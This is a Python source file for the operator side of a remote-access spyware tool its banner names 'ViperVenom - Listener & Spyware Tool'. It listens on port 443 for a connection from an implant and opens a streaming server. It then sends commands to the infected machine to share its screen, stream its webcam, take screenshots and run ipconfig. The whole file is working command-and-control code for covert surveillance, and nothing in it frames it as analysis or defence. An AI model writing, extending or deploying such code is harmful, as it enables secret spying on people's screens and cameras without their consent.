import socket
import time
import platform
import os
import threading
from termcolor import colored
from vidstream import *
from PIL import Image

# =====================================================> Clears Terminal
def Clear():
    if platform.system() == "Windows":
        os.system('cls')
    else:
        os.system("clear")

Clear()

time.sleep(2)

# =====================================================> Banner
def Banner():
    
    print(colored('''
 ██▒   █▓ ██▓ ██▓███  ▓█████  ██▀███   ██▒   █▓▓█████  ███▄    █  ▒█████   ███▄ ▄███▓
▓██░   █▒▓██▒▓██░  ██▒▓█   ▀ ▓██ ▒ ██▒▓██░   █▒▓█   ▀  ██ ▀█   █ ▒██▒  ██▒▓██▒▀█▀ ██▒
 ▓██  █▒░▒██▒▓██░ ██▓▒▒███   ▓██ ░▄█ ▒ ▓██  █▒░▒███   ▓██  ▀█ ██▒▒██░  ██▒▓██    ▓██░
  ▒██ █░░░██░▒██▄█▓▒ ▒▒▓█  ▄ ▒██▀▀█▄    ▒██ █░░▒▓█  ▄ ▓██▒  ▐▌██▒▒██   ██░▒██    ▒██ 
   ▒▀█░  ░██░▒██▒ ░  ░░▒████▒░██▓ ▒██▒   ▒▀█░  ░▒████▒▒██░   ▓██░░ ████▓▒░▒██▒   ░██▒
   ░ ▐░  ░▓  ▒▓▒░ ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░   ░ ▐░  ░░ ▒░ ░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ░  ░
   ░ ░░   ▒ ░░▒ ░      ░ ░  ░  ░▒ ░ ▒░   ░ ░░   ░ ░  ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░  ░      ░
     ░░   ▒ ░░░          ░     ░░   ░      ░░     ░      ░   ░ ░ ░ ░ ░ ▒  ░      ░   
      ░   ░              ░  ░   ░           ░     ░  ░         ░     ░ ░         ░   
     ░                                     ░                                         ''', 'red'))
    print(colored("            ViperVenom - Listener & Spyware Tool Maintained By Itay Funes", "cyan"))
    print()
Banner()

# =====================================================> Main Menu
def Menu():
    print(colored("""
1) Start Handler Listener
""", 'blue'))
    print()
Menu()
# =====================================================> Vars

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
des=input(colored("Pleases Select Option: ", 'yellow'))
BUFFER_SIZE = 1024

# =====================================================> Backdoor Listener

def Listener():
    ListenerHost= "192.168.1.199"
    ListenerPort= 443
    s.bind((ListenerHost, ListenerPort))
    s.listen(10)
    conn, addr = s.accept()
    recv_data = conn.recv(BUFFER_SIZE).decode("utf-8")
    with conn:
        print(f"Recived Connection From: {addr}: {recv_data}")

        serv = StreamingServer(ListenerHost, 4833)
        serv.start_server()
        time.sleep(2)
        print("[+] Connecting to the Session...")

        while True:
            Handler = input(f"{addr[0]}:{recv_data} ⇄ ")

            if Handler == "screenshare":       
                conn.send(Handler.encode("utf-8"))
            elif Handler == "webcam_stream":
                conn.send(Handler.encode("utf-8"))
            elif Handler == "cls":
                if platform.system() == "Linux":
                    os.system('clear')
                else:
                    os.system("cls")
            elif Handler == "exit":
                exit()
            elif Handler == "screenshot":
                conn.send(Handler.encode("utf-8"))
            elif Handler == "ipconfig":
                conn.send(Handler.encode("utf-8"))
                conn.recv(BUFFER_SIZE)
                








if des >= "1":
    Listener()

else:
    pass


if des >= "2":
    pass

